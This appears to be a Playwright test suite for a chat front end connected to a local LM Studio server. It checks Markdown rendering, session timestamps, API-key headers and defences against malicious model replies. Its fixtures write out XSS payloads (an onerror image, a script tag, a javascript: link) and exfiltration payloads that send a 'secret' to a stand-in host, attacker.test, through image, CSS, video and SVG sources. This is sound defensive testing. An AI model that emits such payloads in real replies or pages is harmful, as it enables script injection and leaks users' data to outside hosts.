import { expect, test } from "@playwright/test";
import {
  LM_STUDIO,
  mockLmStudio,
  openLmStudioSettings,
  sendChatMessage,
} from "./support/app";

const MODELS = [{ key: "google/gemma-3-12b" }];

test.describe("Chat", () => {
  test("renders the reply as Markdown", async ({ page }) => {
    await mockLmStudio(page, {
      models: MODELS,
      reply: "# Title\n\n**bold** text",
    });
    await openLmStudioSettings(page);

    await sendChatMessage(page, "hello");

    await expect(page.getByRole("heading", { name: "Title" })).toBeVisible();
    await expect(page.locator("strong", { hasText: "bold" })).toBeVisible();
  });

  test("keeps the session's createdAt across later messages", async ({
    page,
  }) => {
    await mockLmStudio(page, { models: MODELS });
    await openLmStudioSettings(page);
    const readSessions = () =>
      page.evaluate(
        () =>
          new Promise<{ createdAt: number; updatedAt: number }[]>(
            (resolve, reject) => {
              const req = indexedDB.open("chat-history", 1);
              req.onsuccess = () => {
                const all = req.result
                  .transaction("sessions", "readonly")
                  .objectStore("sessions")
                  .getAll();
                all.onsuccess = () => {
                  req.result.close();
                  resolve(all.result);
                };
              };
              req.onerror = () => reject(req.error);
            },
          ),
      );

    await sendChatMessage(page, "first");
    await expect.poll(async () => (await readSessions()).length).toBe(1);
    const [first] = await readSessions();

    await page.waitForTimeout(50);
    await sendChatMessage(page, "second");
    await expect
      .poll(async () => (await readSessions())[0].updatedAt)
      .toBeGreaterThan(first.updatedAt);

    const [second] = await readSessions();
    expect(second.createdAt).toBe(first.createdAt);
  });

  test("sanitizes HTML in the model reply", async ({ page }) => {
    await mockLmStudio(page, {
      models: MODELS,
      reply:
        'safe <img src="x" onerror="window.__xss = 1"> <script>window.__xss = 2</script> [link](javascript:window.__xss=3)',
    });
    await openLmStudioSettings(page);

    await sendChatMessage(page, "hello");

    await expect(page.getByText("safe")).toBeVisible();
    await expect(page.locator("img[onerror]")).toHaveCount(0);
    await expect(page.locator('a[href^="javascript:"]')).toHaveCount(0);
    expect(
      await page.evaluate(() => (window as { __xss?: number }).__xss),
    ).toBe(undefined);
  });

  test("never contacts external servers just by rendering a reply", async ({
    page,
  }) => {
    const external: string[] = [];
    page.on("request", (r) => {
      if (r.url().includes("attacker.test")) external.push(r.url());
    });
    await page.route("https://attacker.test/**", (route) =>
      route.fulfill({ status: 204 }),
    );
    const leak = "https://attacker.test/x?d=secret";
    await mockLmStudio(page, {
      models: MODELS,
      reply: [
        `![chart](${leak})`,
        `<img src="${leak}&v=2">`,
        `<p style="background:url(${leak}&v=3)">styled</p>`,
        `<video poster="${leak}&v=4"></video>`,
        `<svg><image href="${leak}&v=5"></image></svg>`,
      ].join("\n\n"),
    });
    await openLmStudioSettings(page);

    await sendChatMessage(page, "hello");
    await expect(page.getByText("styled")).toBeVisible();
    await page.waitForTimeout(500);

    expect(external).toEqual([]);
    // External images are shown as click-to-open links
    const link = page.getByRole("link", { name: "🖼 chart" });
    await expect(link).toHaveAttribute("href", leak);
    await expect(link).toHaveAttribute("target", "_blank");
  });

  test("CSP blocks external images even if one reaches the DOM", async ({
    page,
  }) => {
    // CSP-blocked loads still fire the request event, so check for responses instead
    const responses: string[] = [];
    page.on("response", (r) => {
      if (r.url().includes("attacker.test")) responses.push(r.url());
    });
    await page.route("https://attacker.test/**", (route) =>
      route.fulfill({ status: 204 }),
    );
    await page.goto("/");

    const violation = await page.evaluate(
      () =>
        new Promise<string>((resolve) => {
          document.addEventListener("securitypolicyviolation", (e) =>
            resolve(e.effectiveDirective),
          );
          const img = document.createElement("img");
          img.src = "https://attacker.test/direct.png";
          document.body.append(img);
          setTimeout(() => resolve("none"), 2000);
        }),
    );

    expect(violation).toBe("img-src");
    expect(responses).toEqual([]);
  });

  test("sends the Authorization header only when an API key is set", async ({
    page,
  }) => {
    const mock = await mockLmStudio(page, { models: MODELS });
    await openLmStudioSettings(page);

    await sendChatMessage(page, "without key");
    const withoutKey = mock.requests.filter((r) =>
      r.url().startsWith(LM_STUDIO),
    );
    expect(withoutKey.length).toBeGreaterThan(0);
    for (const request of withoutKey) {
      expect(await request.headerValue("authorization")).toBeNull();
    }

    await page
      .getByRole("button", { name: /Settings/ })
      .first()
      .click();
    const chatRequest = page.waitForRequest(`${LM_STUDIO}/v1/chat/completions`);
    await page.locator("#apikey").fill("test-key");
    await sendChatMessage(page, "with key");
    expect(await (await chatRequest).headerValue("authorization")).toBe(
      "Bearer test-key",
    );
  });
});
